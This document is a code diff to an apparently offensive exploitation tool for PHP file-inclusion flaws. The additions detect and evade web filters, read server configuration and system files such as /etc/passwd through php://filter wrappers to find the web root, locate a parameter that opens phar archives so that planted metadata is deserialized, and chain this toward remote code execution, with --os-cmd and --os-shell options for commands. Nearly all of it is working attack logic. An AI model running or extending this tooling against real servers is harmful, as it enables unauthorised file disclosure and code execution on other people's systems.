@@ -26,6 +26,7 @@ from ...core.filters import php_runner
 from ...core.mutate import Kind, Variant
 from ...engine.blackboard import Confidence
 from ...engine.evidence import Judge, Verdict
+from ...engine.filterprobe import probe_filter, probe_without_agent
 from ...engine.inject import (
     candidates as _candidates,
     inject as _inject,
@@ -34,6 +35,7 @@ from ...engine.inject import (
     record as _record,
 )
 from ...engine.statemachine import Action, RunContext, State, StateGraph, Transition
+from ...engine.webroot import note_read
 from .seeds import (
     FILE_TARGETS,
     GENERIC_REMOTE,
@@ -42,6 +44,7 @@ from .seeds import (
     PHP_CODE,
     PHP_FILTER_READ,
     PHP_PLAIN_READ,
+    ROOT_DISCLOSURE_TARGETS,
     Wrapper,
     php_code,
 )
@@ -176,7 +179,34 @@ def _differs_from_missing(
     return Judge.strip_echo(exchange.response.text, control) != Judge.strip_echo(seen, payload)
 
 
-def _proven(ctx: RunContext, wrapper: Wrapper, param, variant, request, verdict, note: str = "") -> None:
+def _path_of(payload: str) -> str:
+    """The file path inside a payload, whatever wrapper was built around it.
+
+    A read that worked says two things: the wrapper is accepted, and the path it
+    named exists. The second is worth keeping whichever spelling produced it -
+    `php://filter/convert.base64-encode/resource=/var/www/html/flag.php` is a
+    statement about `/var/www/html/flag.php`, and so is `/etc/passwd` on its own.
+    """
+    for marker in ("resource=", "resource = "):
+        index = payload.find(marker)
+        if index != -1:
+            candidate = payload[index + len(marker):]
+            return candidate.split("|")[0].strip()
+    if "://" not in payload:
+        return payload.strip()
+    return ""
+
+
+def _proven(
+    ctx: RunContext,
+    wrapper: Wrapper,
+    param,
+    variant,
+    request,
+    verdict,
+    note: str = "",
+    body: str = "",
+) -> None:
     """Record a wrapper that answered, as a finding and on the board."""
     entry = {
         "name": wrapper.name,
@@ -191,6 +221,15 @@ def _proven(ctx: RunContext, wrapper: Wrapper, param, variant, request, verdict,
     }
     _note_finding(ctx, entry)
     _record(ctx, WRAPPERS, wrapper.name, evidence=note or verdict.reason, confidence=Confidence.CONFIRMED)
+
+    # A file that was read says where files live, and whoever writes one next
+    # needs that. Only reads count: a `data://` payload has no path in it, and
+    # the wrapper's own spelling is not a location on the target. The response is
+    # scanned as well, because a server's configuration names the directory it
+    # serves and that settles the question rather than narrowing it.
+    if wrapper.family.endswith("read") or wrapper.family == "read":
+        note_read(ctx.blackboard, _path_of(variant.value), body)
+
     ctx.blackboard.set(
         PROVEN,
         True,
@@ -247,7 +286,7 @@ def _try_wrapper(ctx: RunContext, param, wrapper: Wrapper, action: str, targets:
                 )
         if not verdict.confirmed:
             continue
-        _proven(ctx, wrapper, param, variant, request, verdict)
+        _proven(ctx, wrapper, param, variant, request, verdict, body=exchange.response.text)
         return True
     return False
 
@@ -316,8 +355,49 @@ def probe_code(ctx: RunContext) -> None:
             return
 
 
+def find_archive_sink(ctx: RunContext) -> None:
+    """Find the parameter the target hands to something that opens archives.
+
+    This is what an uploaded phar needs in order to matter. On PHP 8 a metadata
+    blob is deserialized only when the application asks for it, so the chain
+    needs a call site that opens an archive it was pointed at - and applications
+    do have those, for configuration, caches and bundles.
+
+    The call site announces itself. Point a parameter at a file that is not an
+    archive and PHP answers `Cannot create phar ... file extension not
+    recognised`, which can only come from a value reaching `new Phar(...)`. A
+    parameter that merely gets read answers with a not-found instead, and the two
+    are not the same finding.
+    """
+    from ...engine.archivesink import probe_archive_sink
+
+    for param in _candidates(ctx):
+        if ctx.stopped:
+            return
+        found = probe_archive_sink(ctx, param)
+        if not found.confirmed:
+            continue
+        ctx.emit(f"  [+] {found.describe()}")
+        ctx.blackboard.set(
+            "proto.archive.sink",
+            found.param,
+            evidence=found.describe(),
+            confidence=Confidence.CONFIRMED,
+        )
+        _record(
+            ctx,
+            "archive-sink",
+            found.param,
+            evidence=found.evidence,
+            confidence=Confidence.CONFIRMED,
+        )
+        return
+
+
 def probe_archive(ctx: RunContext) -> None:
     """Reach a file through a container, when one is known to be there."""
+    find_archive_sink(ctx)
+
     upload = ctx.config.get("upload") or ""
     targets = _file_targets(ctx)
     for param in _candidates(ctx):
@@ -344,7 +424,7 @@ def probe_archive(ctx: RunContext) -> None:
             )
             if not verdict.confirmed:
                 continue
-            _proven(ctx, wrapper, param, variant, request, verdict)
+            _proven(ctx, wrapper, param, variant, request, verdict, body=exchange.response.text)
 
 
 def probe_remote(ctx: RunContext) -> None:
@@ -402,6 +482,47 @@ class _Evidence:
         self.detail = detail
 
 
+def probe_filter_action(ctx: RunContext) -> None:
+    """Ask once whether anything is filtering, before payloads are spent.
+
+    Two questions, and they catch different things. A probe carrying SQL, a
+    script tag, a traversal and a shell metacharacter is what a rule set is
+    written to catch, and the answer to it names the product when the product
+    names itself. A request with no User-Agent at all is what almost every filter
+    treats as a scanner, so it finds the ones that do not advertise.
+
+    Doing this first means the escalation ladder starts where it should rather
+    than discovering it one refusal at a time.
+    """
+    candidates = _candidates(ctx)
+    if not candidates:
+        return
+
+    outcome = probe_filter(ctx, candidates[0])
+    if outcome.refused:
+        ctx.info(f"   {outcome.describe()}")
+        ctx.blackboard.set(
+            "filter.detected",
+            True,
+            evidence=outcome.describe(),
+            confidence=Confidence.LIKELY,
+        )
+    elif outcome.note:
+        ctx.info(f"   {outcome.note}")
+
+    bare = probe_without_agent(ctx, candidates[0])
+    if bare.refused and bare.note:
+        ctx.info(f"   {bare.note}")
+        ctx.blackboard.set(
+            "filter.watches-for-scanners",
+            True,
+            evidence=bare.note,
+            confidence=Confidence.LIKELY,
+        )
+    elif bare.note:
+        ctx.log(f"   {bare.note}")
+
+
 def classify(ctx: RunContext) -> None:
     """Say what the parameter turned out to be, or that nothing came through."""
     if not ctx.blackboard.get(PROVEN):
@@ -452,8 +573,15 @@ def exploit_filter_chain(ctx: RunContext) -> None:
         ctx.blackboard.set(
             "proto.rce",
             True,
-            evidence=reason,
+            evidence=(
+                f"a generated chain ran: {reason}. This proves the target executes what the "
+                "chain builds. No command was sent - add --os-cmd or --os-shell to run one"
+            ),
             confidence=Confidence.CONFIRMED,
+        )
+        ctx.info(
+            "   the chain runs here. Nothing was executed: this only sent an echo. "
+            "Use --os-cmd or --os-shell to send a command"
         )
         return
 
@@ -467,6 +595,62 @@ _CHAIN = Wrapper(
     signatures=(),
     note="a filter chain that builds its payload in the stream; no file, no upload",
 )
+
+
+def probe_webroot(ctx: RunContext) -> None:
+    """Read the server's own configuration to learn which directory it serves.
+
+    Everything else about the web root is inference: a path read somewhere is a
+    good clue, a stock location is a guess. A server's configuration is not -
+    `DocumentRoot /var/www/html` is the server stating which directory it answers
+    from, and it is usually readable, because the server writes its own logs as
+    the same user the application runs as.
+
+    Worth the requests because a chain that writes a file needs an absolute path
+    and there is no getting one from a relative path: PHP resolves those against
+    the process's working directory, which for a web request is not reliably the
+    directory it serves. Measured, not assumed - a gadget given a relative path
+    wrote into the filesystem root, where nothing is served.
+    """
+    if ctx.config.get("webroot"):
+        return
+    if ctx.blackboard.get("target.paths.webroot"):
+        return
+
+    from ...engine.webroot import webroot_from_config
+
+    for param in _candidates(ctx):
+        if ctx.stopped:
+            return
+        for path in ROOT_DISCLOSURE_TARGETS:
+            if ctx.stopped:
+                return
+            outcome = _inject(ctx, param, path, "probe.webroot")
+            if outcome is None:
+                continue
+            _, exchange = outcome
+            if exchange.response.error:
+                continue
+            for found in webroot_from_config(exchange.response.text):
+                ctx.info(f"   the server's configuration says it serves {found}")
+                ctx.blackboard.add(
+                    "target.paths.webroot",
+                    found,
+                    evidence=f"{path} names it",
+                    confidence=Confidence.CONFIRMED,
+                )
+                return
+
+
+def run_phar_chain(ctx: RunContext) -> None:
+    """The archive chain, reached only when a gadget was named.
+
+    Imported here rather than at module scope: `deserialize` asks this module for
+    the run's parameters, and a top-level import in both directions is a cycle.
+    """
+    from .deserialize import exploit_phar
+
+    exploit_phar(ctx)
 
 
 def report_summary(ctx: RunContext) -> None:
@@ -505,7 +689,9 @@ def build_graph(name: str = "proto") -> StateGraph:
             name="probe",
             description="what this parameter will accept, and what it will give back",
             actions=[
+                Action("filter.probe", "find out whether anything is filtering", probe_filter_action),
                 Action("probe.read", "read a file through every wrapper that can", probe_read),
+                Action("probe.webroot", "read the server's configuration for where it serves", probe_webroot),
                 Action("probe.code", "ask the target to run something", probe_code),
                 Action("probe.archive", "reach a file through a container", probe_archive),
                 Action("probe.remote", "plant a callback and see if the target dials it", probe_remote),
@@ -534,6 +720,27 @@ def build_graph(name: str = "proto") -> StateGraph:
             description="build the payload inside the stream instead of on disk",
             actions=[
                 Action("exploit.filter_chain", "run code through a generated filter chain", exploit_filter_chain)
+            ],
+            transitions=[
+                Transition(
+                    "deserialize",
+                    lambda ctx: bool(ctx.config.get("phar_class")),
+                    "a gadget was named, so the archive chain is worth trying",
+                ),
+                Transition("finish", lambda ctx: True, "done"),
+            ],
+        )
+    )
+    graph.add(
+        State(
+            name="deserialize",
+            description="get an archive's metadata deserialized on the target",
+            actions=[
+                Action(
+                    "exploit.phar",
+                    "point the archive-opening parameter at a gadget and read the result",
+                    run_phar_chain,
+                )
             ],
             transitions=[Transition("finish", lambda ctx: True, "done")],
         )
